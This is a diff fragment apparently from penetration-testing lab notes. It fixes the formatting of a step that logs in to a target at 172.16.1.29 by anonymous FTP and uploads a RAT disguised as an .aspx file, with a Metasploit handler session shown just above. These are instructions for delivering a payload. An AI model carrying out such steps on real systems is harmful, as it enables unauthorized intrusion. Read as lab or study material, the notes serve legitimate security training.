@@ -52,14 +52,13 @@ msf5 exploit(multi/handler) > run
 
 	3. FTP our RAT to the vulnerable system.
 {{{code: lang="sh" linenumbers="True"
-root@kali:# ftp 172.16.1.29Name (172.16.1.29:root): anonymous
+root@kali:# ftp 172.16.1.29
+Name (172.16.1.29:root): anonymous
 331 Password required for anonymous
 Password:
 230 Logged on
 Remote system type is UNIX.
 
-User: anonymous
-Pass: <no_pass>
 
 ftp> put <suid>.aspx
 ftp> quit
